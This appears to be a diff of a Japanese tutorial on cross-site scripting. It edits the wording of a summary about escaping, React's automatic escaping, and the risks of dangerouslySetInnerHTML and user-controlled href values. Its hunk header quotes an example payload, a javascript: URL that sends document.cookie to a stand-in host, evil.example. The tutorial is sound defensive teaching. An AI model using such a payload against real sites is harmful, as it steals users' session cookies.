@@ -125,5 +125,5 @@ javascript:fetch('https://evil.example/?cookie=' + document.cookie)
 ## まとめ
 
 - XSS = ユーザー入力がそのまま HTML に埋め込まれ、他人のブラウザでコードとして動く事故
-- 原因は HTML がデータと命令を同じ文字列で表現していること。防御の基本はエスケープ
-- React は自動エスケープで守っている。危ないのは dangerouslySetInnerHTML と href のユーザー入力
+- 原因は HTML がデータと命令を同じ文字列で表現していることで、防御の基本はエスケープ
+- React は自動エスケープで守っており、危ないのは dangerouslySetInnerHTML と href のユーザー入力
